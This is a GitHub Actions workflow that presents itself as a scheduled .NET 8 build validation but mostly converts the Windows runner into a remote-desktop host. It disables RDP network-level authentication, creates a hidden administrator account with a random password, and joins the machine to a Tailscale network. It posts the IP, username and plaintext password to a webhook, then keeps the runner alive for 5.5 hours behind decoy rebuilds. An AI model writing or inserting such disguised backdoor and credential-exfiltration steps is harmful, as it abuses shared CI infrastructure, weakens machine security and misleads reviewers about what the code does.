name: .NET 8 Windows Validation (Tailscale)

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 330   # 5.5 ساعات

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      # -------------------- إعداد RDP و Tailscale --------------------
      - name: Configure RDP Settings
        run: |
          # تمكين سطح المكتب البعيد وتعطيل المصادقة على مستوى الشبكة
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force

          # فتح منفذ RDP في جدار الحماية
          netsh advfirewall firewall delete rule name="RDP-Tailscale" > $null 2>&1
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389

          # إعادة تشغيل خدمة سطح المكتب البعيد
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Secure Password
        run: |
          # توليد اسم مستخدم عشوائي (كما في الكود الأصلي)
          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})

          # توليد كلمة مرور قوية (من الكود الثاني)
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)      # A-Z
              Lower   = [char[]](97..122)     # a-z
              Number  = [char[]](48..57)      # 0-9
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126))
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $pwd = -join ($rawPassword | Sort-Object { Get-Random })
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          # إنشاء المستخدم المحلي
          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          # حفظ بيانات الاعتماد للاستخدام لاحقًا
          echo "RDP_USER=$usr" >> $env:GITHUB_ENV
          echo "RDP_PASS=$pwd" >> $env:GITHUB_ENV

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # الاتصال بشبكة Tailscale باستخدام مفتاح المصادقة
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
          
          # انتظار الحصول على عنوان IP
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV

      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Send Connection Info via Webhook
        run: |
          $msg = @"
Target: $env:TAILSCALE_IP:3389
User: $env:RDP_USER
Pass: $env:RDP_PASS
"@
          $body = @{ content = $msg } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

      - name: Run Diagnostics
        run: |
          $rep = "SysDiag:`n"
          $ts = Get-Service TermService -ErrorAction SilentlyContinue
          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
          $rep += "REG: $r1 | $r2`n"
          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
          $tsProcess = Get-Process tailscale -ErrorAction SilentlyContinue
          if ($tsProcess) { $rep += "TS: OK ($($tsProcess.Id))`n" } else { $rep += "TS: ERR`n" }
          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      - name: Run Extended Validation (5.5 hours)
        run: |
          $end = (Get-Date).AddMinutes(330)   # 5.5 ساعات
          while ((Get-Date) -lt $end) {
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            # إعادة بناء المشروع كل نصف ساعة تقريبًا
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              cd ValidationApp
              dotnet build -c Release > $null
            }
            Start-Sleep -Seconds 900   # 15 دقيقة
          }

      - name: Cleanup Environment
        run: |
          Get-Process -Name "tailscale" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
